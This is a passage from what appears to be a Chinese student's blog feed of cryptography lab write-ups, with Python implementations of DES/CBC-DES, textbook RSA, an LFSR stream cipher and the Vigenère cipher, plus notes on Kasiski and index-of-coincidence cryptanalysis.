mes_IP[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):<span class="comment">#16轮F函数迭代</span></span><br><span class="line">        mes_tmp = mes_right</span><br><span class="line">        right_f_res = funcF(mes_right,key_list[i])</span><br><span class="line">        mes_right = xor(right_f_res,mes_left)</span><br><span class="line">        mes_left = mes_tmp</span><br><span class="line">    fin_right = mes_right</span><br><span class="line">    fin_left = xor(funcF(mes_right,key_list[<span class="number">15</span>]),mes_left)</span><br><span class="line">    fin = fin_left+fin_right</span><br><span class="line">    fin = mov_IP(fin)<span class="comment">#IP逆置换</span></span><br><span class="line">    <span class="keyword">return</span> fin<span class="comment">#返回密文</span></span><br><span class="line"><span class="comment">#封装64位解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESdec_test</span><span class="params">(cipher,key)</span>:</span>  <span class="comment">#密文直接输64位2进制</span></span><br><span class="line">    <span class="comment">#cipher = strtobin(str)</span></span><br><span class="line">    key_bin = strtobin(key)</span><br><span class="line">    key_list = key_gen(key_bin)</span><br><span class="line">    cipher = begin_change(cipher)</span><br><span class="line">    i = <span class="number">15</span></span><br><span class="line">    cipher_left = cipher[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    cipher_right = cipher[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">        cipher_tmp = cipher_right</span><br><span class="line">        cipher_right = xor(cipher_left,funcF(cipher_right,key_list[i]))</span><br><span class="line">        cipher_left = cipher_tmp</span><br><span class="line">        i = i <span class="number">-1</span></span><br><span class="line">    fin_left = xor(cipher_left,funcF(cipher_right,key_list[<span class="number">0</span>]))</span><br><span class="line">    fin_right = cipher_right</span><br><span class="line">    fin = fin_left+fin_right</span><br><span class="line">    fin = mov_IP(fin)</span><br><span class="line">    my_plain = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(fin),<span class="number">8</span>):</span><br><span class="line">        my_plain += chr(int(fin[j:j+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> my_plain</span><br><span class="line"><span class="comment">#alice_bob</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESdec_ab</span><span class="params">(cipher,key)</span>:</span>  <span class="comment">#密文直接输64位2进制</span></span><br><span class="line">    <span class="comment">#cipher = strtobin(str)</span></span><br><span class="line">    key_bin = key</span><br><span class="line">    key_list = key_gen(key_bin)</span><br><span class="line">    cipher = begin_change(cipher)</span><br><span class="line">    i = <span class="number">15</span></span><br><span class="line">    cipher_left = cipher[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    cipher_right = cipher[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">        cipher_tmp = cipher_right</span><br><span class="line">        cipher_right = xor(cipher_left,funcF(cipher_right,key_list[i]))</span><br><span class="line">        cipher_left = cipher_tmp</span><br><span class="line">        i = i <span class="number">-1</span></span><br><span class="line">    fin_left = xor(cipher_left,funcF(cipher_right,key_list[<span class="number">0</span>]))</span><br><span class="line">    fin_right = cipher_right</span><br><span class="line">    fin = fin_left+fin_right</span><br><span class="line">    fin = mov_IP(fin)</span><br><span class="line">    my_plain = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(fin),<span class="number">8</span>):</span><br><span class="line">        my_plain += chr(int(fin[j:j+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> my_plain</span><br><span class="line"><span class="comment">#DES加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESenc</span><span class="params">(mes,key)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> mes[i:i+<span class="number">8</span>] != <span class="string">""</span>:</span><br><span class="line">        res += DESenc_test(mes[i:i+<span class="number">8</span>],key)</span><br><span class="line">        i = i+<span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#alice_bob</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESenc_a</span><span class="params">(mes,key)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    res += DESenc_ab(mes,key)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#DES解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESdec</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> cipher[i:i + <span class="number">64</span>] != <span class="string">""</span>:</span><br><span class="line">        res += DESdec_test(cipher[i:i + <span class="number">64</span>], key)</span><br><span class="line">        i = i + <span class="number">64</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#cbc模式下加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_desenc</span><span class="params">(mes,key)</span>:</span></span><br><span class="line">    IV=<span class="string">"aaaaaaaa"</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    cns=<span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> mes[i:i+<span class="number">8</span>]!=<span class="string">""</span>:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">            res+=DESenc_test(bintostr(xor(strtobin(IV),strtobin(mes[i:i+<span class="number">8</span>]))),key)</span><br><span class="line">            cns=DESenc_test(bintostr(xor(strtobin(IV),strtobin(mes[i:i+<span class="number">8</span>]))),key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=DESenc_test(bintostr(xor(cns,strtobin(mes[i:i+<span class="number">8</span>]))),key)</span><br><span class="line">            cns=DESenc_test(bintostr(xor(cns,strtobin(mes[i:i+<span class="number">8</span>]))),key)</span><br><span class="line">        i=i+<span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#cbc模式下解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_desdec</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    IV=<span class="string">"aaaaaaaa"</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    cns=<span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> cipher[i:i+<span class="number">64</span>]!=<span class="string">""</span>:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">            res+=bintostr(xor(strtobin(DESdec_test(cipher[i:i+<span class="number">64</span>],key)),strtobin(IV)))</span><br><span class="line">            cns=cipher[i:i+<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=bintostr(xor(strtobin(DESdec_test(cipher[i:i+<span class="number">64</span>],key)),cns))</span><br><span class="line">            cns=cipher[i:i+<span class="number">64</span>]</span><br><span class="line">        i=i+<span class="number">64</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#main</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    m = input(<span class="string">"Please enter your plaintext:\n\t"</span>)</span><br><span class="line">    lm = len(m)</span><br><span class="line">    <span class="comment"># 若不是8的倍数，则用0填充</span></span><br><span class="line">    lm_mod = lm % <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> lm_mod != <span class="number">0</span>:</span><br><span class="line">        FillLength = <span class="number">8</span> - lm_mod</span><br><span class="line">        m += FillLength * <span class="string">"0"</span><span class="comment">#padding</span></span><br><span class="line">        lm += FillLength</span><br><span class="line">    k = input(<span class="string">"Please enter your key:\n\t"</span>)</span><br><span class="line">    c_t=bintostr(DESenc(m,k))</span><br><span class="line">    print(<span class="string">"DES:\n\t"</span>,c_t)</span><br><span class="line">    print(<span class="string">"CBC_DES:\n\t"</span>,bintostr(cbc_desenc(m,k)))</span><br><span class="line">    <span class="string">'''c = input("Please enter your ciphertext:\n\t")</span></span><br><span class="line"><span class="string">    k_1 = input("Please enter your key:\n\t")</span></span><br><span class="line"><span class="string">    print(DESdec(strtobin(c),k_1))'''</span></span><br><span class="line">    print(<span class="string">"DES解密\n\t"</span>,DESdec(DESenc(m,k),k))</span><br><span class="line">    c2= input(<span class="string">"Please enter your cbc_ciphertext:\n\t"</span>)</span><br><span class="line">    k_2=input(<span class="string">"Please enter your key:\n\t"</span>)</span><br><span class="line">    print(cbc_desdec(cbc_desenc(m,k),k_2))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br><span class="line">实验四</span><br><span class="line">RSA加密</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FastMod</span><span class="params">(x, n, m)</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = x</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        temp = n</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span> :</span><br><span class="line">            a = a * b % m</span><br><span class="line">        b = b * b % m</span><br><span class="line">        n = n//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> temp &lt; <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">computeD</span><span class="params">(e, phi_n)</span>:</span></span><br><span class="line">    (x, y, r) = extendedGCD(phi_n, e)</span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> phi_n + y</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendedGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    x1 = <span class="number">1</span></span><br><span class="line">    y1 = <span class="number">0</span></span><br><span class="line">    x2 = <span class="number">0</span></span><br><span class="line">    y2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        q = a // b</span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        x = x1 - q*x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        y = y1 - q*y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line">    <span class="keyword">return</span>(x1, y1, a)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2Hex</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(x)) <span class="keyword">for</span> x <span class="keyword">in</span> m)</span><br><span class="line"><span class="comment"># 素性检验：采用 Miler-Rabin 检验法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin</span><span class="params">(n,k=<span class="number">80</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    r, s = <span class="number">0</span>, n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        s //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(k):</span><br><span class="line">        a = random.randrange(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        x = pow(a, s, n)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            x = pow(x, <span class="number">2</span>, n)</span><br><span class="line">            <span class="keyword">if</span> x == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="comment"># 生成 b 位的素数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genPrime</span><span class="params">(b=<span class="number">1024</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># the highest bit is 1</span></span><br><span class="line">        ans = <span class="string">"1"</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(b<span class="number">-2</span>):</span><br><span class="line">            ans += str(random.randint(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">        <span class="comment"># the lowest bit is 1</span></span><br><span class="line">        ans += <span class="string">"1"</span></span><br><span class="line">        ans = int(ans,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> miller_rabin(ans):</span><br><span class="line">            <span class="keyword">return</span> ans</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genE</span><span class="params">(phi_n)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        e = genPrime(b=random.randint(<span class="number">3</span>,<span class="number">13</span>))</span><br><span class="line">        <span class="keyword">if</span> e == <span class="number">3</span> <span class="keyword">or</span> e == <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> phi_n%e != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAEncrypt</span><span class="params">(m,n,e)</span>:</span></span><br><span class="line">    m = int(str2Hex(m),<span class="number">16</span>)</span><br><span class="line">    c = pow(m,e,n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSADecrypt</span><span class="params">(c,d,n)</span>:</span></span><br><span class="line">    m = pow(c,d,n)</span><br><span class="line">    m = bytes.fromhex(<span class="string">'&#123;:x&#125;'</span>.format(m))</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 生成两个大素数p和q</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Generate p and q ......"</span>)</span><br><span class="line">    p = genPrime()</span><br><span class="line">    q = genPrime()</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"p = "</span>+str(p))</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"q = "</span>+str(q))</span><br><span class="line">    <span class="comment"># 计算n = p*q</span></span><br><span class="line">    n = p*q</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"n = "</span>+str(n))</span><br><span class="line">    <span class="comment"># 计算φ(n) = p*q</span></span><br><span class="line">    phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"\nGenerate e ......"</span>)</span><br><span class="line">    <span class="comment"># 生成一个和φ(n)互素的数e</span></span><br><span class="line">    e = genE(phi_n)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"e = "</span>+str(e))</span><br><span class="line">    m = <span class="string">"Hello world!"</span></span><br><span class="line">    <span class="comment"># 加密算法</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Encryption "</span>+<span class="number">8</span>*<span class="string">"*"</span>)</span><br><span class="line">    Ciphertext = RSAEncrypt(m,n,e)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"The Ciphertext is:\n\t"</span>+str(Ciphertext))</span><br><span class="line">    <span class="comment"># 解密算法</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Decryption "</span>+<span class="number">8</span>*<span class="string">"*"</span>)</span><br><span class="line">    <span class="comment"># 使用私钥d，d是e模φ(n)的逆</span></span><br><span class="line">    d = computeD(e,phi_n)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"d = "</span>+str(d))</span><br><span class="line">    Plaintext = RSADecrypt(Ciphertext,d,n)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"The Plaintext is:\n\t"</span>+str(Plaintext))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;密码学中的DES加密。&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>序列密码</title>
    <link href="https://1187100546.github.io/2020/01/03/lsfr/"/>
    <id>https://1187100546.github.io/2020/01/03/lsfr/</id>
    <published>2020-01-03T08:56:18.000Z</published>
    <updated>2020-01-03T09:02:53.396Z</updated>
    
    <content type="html"><![CDATA[<p>密码学中的序列密码。</p><a id="more"></a><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>选择一个15次以上的不可约多项式，编写一个线性反馈移位寄存器。验证生成序列的周期。</p><h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><p>利用python数组的pop操作可以实现移位的效果，将反馈函数写成0，1数组，便可以实现反馈效果。</p><h2 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h2><h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(lst, k,key)</span>:</span></span><br><span class="line">    temp_l= lst[:]</span><br><span class="line">    temp_k= key[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="comment">#temp.append(temp.pop(0))</span></span><br><span class="line">        k_out=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">            <span class="keyword">if</span>(temp_k[j]==<span class="number">1</span>):</span><br><span class="line">                k_out+=(temp_k[j]+temp_l[j])%<span class="number">2</span></span><br><span class="line">        k_out=k_out%<span class="number">2</span></span><br><span class="line">        <span class="comment">#print(k_out)</span></span><br><span class="line">        temp_l.pop(<span class="number">0</span>)</span><br><span class="line">        temp_l.append(k_out)</span><br><span class="line">        print(<span class="string">"当前寄存器值："</span>,temp_l,<span class="string">"循环次数："</span>,i+<span class="number">1</span>,temp_l==lst)</span><br><span class="line">    <span class="comment">#return temp</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    lst=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">    k=<span class="number">262146</span></span><br><span class="line">    key=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    lfsr(lst,k,key)</span><br><span class="line">print(len(key))</span><br></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p>18次线性移位寄存器，当运行到周期次数时开始重复。</p><p>寄存器初始值：[0,1,1,1,0,0,0,1,0,1,0,0,1,0,0,1,0,1]</p><p>本原多项式：[1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0]</p><p><img src="https://s2.ax1x.com/2020/01/03/lauAUg.png" alt="lauAUg.png"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>由算法的实现可知，序列密码算法的加解密对种子秘钥的依赖十分强烈。故需要保证种子秘钥的安全性。对于此可进行相关攻击。</p><p>可以进行穷举搜素攻击，故为了保证安全强度，要求秘钥长度足够长。</p><p>弱密钥攻击，弱密钥会产生重复的密钥流，一旦子密钥序列出现了重复，密文就有可能被破解。</p><h2 id="合理性分析"><a href="#合理性分析" class="headerlink" title="合理性分析"></a>合理性分析</h2><p>序列密码具有实现简单、便于硬件实施、加解密处理速度快、没有或只有有限的错误传播等特点，因此在实际应用中，特别是专用或机密机构中保持着优势，序列密码是一个随时间变化的加密变换，具有转换速度快、低错误传播的优点，硬件实现电路更简单。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;密码学中的序列密码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>古典密码</title>
    <link href="https://1187100546.github.io/2020/01/03/gudianmima/"/>
    <id>https://1187100546.github.io/2020/01/03/gudianmima/</id>
    <published>2020-01-03T08:35:15.000Z</published>
    <updated>2020-01-03T09:02:03.747Z</updated>
    
    <content type="html"><![CDATA[<p>密码学中的古典密码。</p><a id="more"></a><h2 id="维吉尼亚密码原理"><a href="#维吉尼亚密码原理" class="headerlink" title="维吉尼亚密码原理"></a>维吉尼亚密码原理</h2><p>维吉尼亚密码是一种简单的多表代换密码，可以看成由一些偏移量不同的恺撒密码组成。为了掩盖字母使用中暴露的频率特征，解决的办法就是用多套符号代替原来的文字。它是一个表格，第一行代表原文的字母，下面每一横行代表原文分别由哪些字母代替，每一竖列代表我们要用第几套字符来替换原文。一共26个字母，一共26套代替法，所以这个表是一个26*26的表  .</p><p><img src="https://s2.ax1x.com/2020/01/03/laA81K.png" alt="laA81K.png"></p><h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><p>$$<br>c_i=(m_i+k_i)mod26<br>$$</p><p>若密钥长度小于明文长度，则密钥循环使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VigenereEncrypt</span><span class="params">(m,k)</span>:</span></span><br><span class="line">    k = k.upper()</span><br><span class="line">    lm = len(m)</span><br><span class="line">    lk = len(k)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    ans = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lm):</span><br><span class="line">        <span class="keyword">if</span> m[i].isupper():</span><br><span class="line">            ans += chr(((ord(m[i])-ord(<span class="string">'A'</span>))%<span class="number">26</span>+(ord(k[j%lk])-ord(<span class="string">'A'</span>))%<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'A'</span>))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> m[i].islower():</span><br><span class="line">            ans += chr(((ord(m[i])-ord(<span class="string">'a'</span>))%<span class="number">26</span>+(ord(k[j%lk])-ord(<span class="string">'A'</span>))%<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans += m[i]</span><br><span class="line"><span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h3 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h3><p>$$<br>m_i=(c_i+26-k_i)mod\ 26<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VigenereDecrypt</span><span class="params">(c,k)</span>:</span></span><br><span class="line">    k = k.upper()</span><br><span class="line">    lc = len(c)</span><br><span class="line">    lk = len(k)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    ans = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lc):</span><br><span class="line">        <span class="keyword">if</span> c[i].isupper():</span><br><span class="line">            ans += chr(((ord(c[i])-ord(<span class="string">'A'</span>))%<span class="number">26</span>+<span class="number">26</span>-(ord(k[j%lk])-ord(<span class="string">'A'</span>))%<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'A'</span>))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c[i].islower():</span><br><span class="line">            ans += chr(((ord(c[i])-ord(<span class="string">'a'</span>))%<span class="number">26</span>+<span class="number">26</span>-(ord(k[j%lk])-ord(<span class="string">'A'</span>))%<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans += c[i]</span><br><span class="line"><span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>破译维吉尼亚密码的关键在于它的密钥是循环重复的。如果我们知道了密钥的长度，那密文就可以被看作是交织在一起的凯撒密码，而其中每一个都可以单独破解。</p><p>多表代换密码体制的分析方法主要分为三步：第一步确定秘钥长度，常用的方法有卡西斯基（Kasiski）测试法和重合指数法（Index of Coincidence）；第二步就是确定秘钥，常用的方法是拟重合指数测试法；第三步是根据第二步确定的密钥恢复出明文。</p><h3 id="Kasiski测试法"><a href="#Kasiski测试法" class="headerlink" title="Kasiski测试法"></a>Kasiski测试法</h3><p>卡西斯基试验是基于类似 the 这样的常用单词有可能被同样的密钥字母进行加密，从而在密文中重复出现。如果将密文中所有相同的字母组都找出来，并计算他们的最大公因数，就有可能提取出来密钥长度信息。</p><p>测试过程：搜索长度至少为2的相邻的一对对相同的密文段，记下它们之间的距离。而密钥长度d可能就是这些距离的最大公因子</p><h3 id="重合指数法"><a href="#重合指数法" class="headerlink" title="重合指数法"></a>重合指数法</h3><p>利用随机文本和英文文本的统计概率差别来分析密钥长度。依据：英文中每种单词出现的频率不同。</p><p>重合指数公式：</p><img src="https://s2.ax1x.com/2020/01/03/laet2t.png" alt="laet2t.png" style="zoom:50%;"><p>人们已经获得了英文的26个字母的概率分布的一个估计。期望值为：</p><img src="https://s2.ax1x.com/2020/01/03/laeNxP.png" alt="laeNxP.png" style="zoom: 67%;"><p>将密文按n来分组，当每组的重合指数都接近0.065时，n便为密钥的长度值</p><h3 id="重合指数算法"><a href="#重合指数算法" class="headerlink" title="重合指数算法"></a>重合指数算法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 